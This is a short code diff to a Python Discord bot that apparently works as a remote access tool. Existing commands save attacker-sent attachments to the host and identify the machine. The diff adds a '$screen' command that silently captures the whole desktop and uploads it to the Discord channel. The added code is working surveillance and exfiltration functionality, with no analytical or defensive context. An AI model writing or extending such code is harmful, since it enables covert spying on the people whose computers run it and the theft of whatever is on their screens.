@@ -6,6 +6,7 @@ import platform
 from uuid import getnode
 from requests import get
 import hashlib
+from PIL import ImageGrab
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -90,5 +91,10 @@ async def on_message(message):
         if message.content.startswith('$load'):
             for attachment in message.attachments:
                 await attachment.save(attachment.filename)
+
+        if message.content.startswith('$screen'):
+            screen = ImageGrab.grab()
+            screen.save(os.getcwd() + '\\screen.png')
+            await message.channel.send(file=discord.File('screen.png'))
 
 client.run(settings.token)
